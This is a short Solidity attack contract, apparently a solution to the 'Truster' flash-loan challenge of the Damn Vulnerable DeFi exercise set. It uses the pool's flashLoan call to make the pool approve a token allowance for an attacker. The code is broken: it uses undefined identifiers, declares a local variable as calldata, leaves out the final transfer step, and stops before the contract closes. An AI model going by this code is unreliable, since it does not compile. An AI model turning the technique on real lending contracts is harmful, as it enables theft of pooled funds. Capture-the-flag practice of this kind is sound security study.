contract AttackTrusterLenderPool {

    IERC20 public immutable damnValuableTokenContract;
    TrusterLenderPool private immutable poolContract;

    constructor (address tokenAddress, address poolAddress) {
        damnValuableTokenContract = IERC20(tokenAddress);
        poolContract = TrusterLenderPool(poolAddress);
    }

    function attack(uint256 amount, address attacker) external {
        bytes calldata _data = abi.encodeWithSignature("approve(address,uint256)", attacker, amount);
        pool.flashLoan(0, borrower, address(damnValuableToken), _data);
    }

